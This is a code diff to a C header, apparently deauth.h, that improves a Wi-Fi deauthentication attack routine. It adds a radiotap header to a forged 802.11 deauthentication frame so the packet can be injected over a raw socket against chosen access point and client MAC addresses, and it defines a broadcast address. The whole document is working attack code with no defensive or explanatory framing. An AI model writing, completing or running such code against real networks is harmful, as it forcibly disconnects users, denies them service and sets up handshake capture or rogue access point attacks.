@@ -1,4 +1,3 @@
-// deauth.h
 #pragma once
 #include <stdint.h>
 #include <sys/socket.h>
@@ -8,6 +7,16 @@
 static const uint8_t broadcastMac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
 static inline bool sendDeauthFrame(int sock, const uint8_t* ifaceMac, const uint8_t* apMac, const uint8_t* stMac) {
+    // Radiotap header
+    uint8_t radiotap_header[] = {
+        0x00, 0x00, // <-- radiotap version
+        0x0c, 0x00, // <-- radiotap header length
+        0x04, 0x80, 0x00, 0x00, // <-- radiotap present flags
+        0x00, 0x00, // <-- radiotap flags
+        0x18, 0x00  // <-- radiotap data rate (24 Mbps)
+    };
+
+    // Deauthentication frame
     uint8_t frame[26] = {0};
 
     // Frame Control: Deauthentication (0xC0)
@@ -35,5 +44,10 @@ static inline bool sendDeauthFrame(int sock, const uint8_t* ifaceMac, const uint
     frame[24] = 0x07;
     frame[25] = 0x00;
 
-    return send(sock, frame, sizeof(frame), 0) != -1;
+    // Combine Radiotap header and deauthentication frame
+    uint8_t packet[sizeof(radiotap_header) + sizeof(frame)];
+    memcpy(packet, radiotap_header, sizeof(radiotap_header));
+    memcpy(packet + sizeof(radiotap_header), frame, sizeof(frame));
+
+    return send(sock, packet, sizeof(packet), 0) != -1;
 }
